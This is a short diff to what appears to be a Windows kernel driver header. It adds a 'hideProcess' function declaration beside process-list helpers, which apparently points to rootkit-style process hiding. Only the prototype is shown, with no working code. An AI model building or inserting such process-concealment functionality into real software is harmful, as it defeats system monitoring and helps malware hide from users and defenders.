@@ -41,6 +41,10 @@ NTSTATUS getProcInfoNext(
 	_Inout_ PMY_PROC_INFO ProcInfo
 	);
 
+NTSTATUS hideProcess(
+	_In_ PCHAR name
+	);
+
 VOID freeListPool();
 
 VOID setActiveProcessHead(
